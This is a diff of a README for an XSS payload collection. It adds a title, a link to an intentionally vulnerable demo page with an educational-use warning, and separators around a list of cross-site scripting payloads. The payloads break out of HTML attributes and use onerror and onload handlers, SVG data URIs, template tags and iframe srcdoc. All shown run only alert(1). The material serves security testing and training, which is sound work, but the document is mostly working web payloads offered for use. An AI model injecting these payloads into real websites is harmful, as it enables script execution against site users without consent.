@@ -1,3 +1,17 @@
+# 🛡️ Aegis - XSS Vulnerability Payload List
+
+![XSS Demo](https://github.com/user-attachments/assets/0854e8c1-9bda-4ac4-9b8a-93ad0e0bf024)
+
+## 🎯 Live Demonstration
+
+**[View Interactive XSS Demonstration](./index.html)** - See these XSS payloads in action!
+
+⚠️ **WARNING**: The demonstration page is intentionally vulnerable for educational purposes only. Never use in production environments.
+
+---
+
+## 📋 XSS Payload Collection
+
 <span class="p-nickname vcard-username d-block" itemprop="additionalName="[your_input_here]">...</span>
 "><IMG SRC="" X-ONERROR="alert(1)">
 "><svg:image id=a xmlns:svg="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href=data:image/svg%2bxml;charset=utf8,%3Csvg%20onload=alert(1)%3E></svg:image>
@@ -46,6 +60,9 @@
 "><template><img src=x onerror=alert(1)> 
 "><script>alert`${1}`</script> 
 "><iframe srcdoc="<script>alert(1)</script>">
+
+---
+
 <!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
 <!--        Author : Ismail Tasdelen -->
 <!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ -->
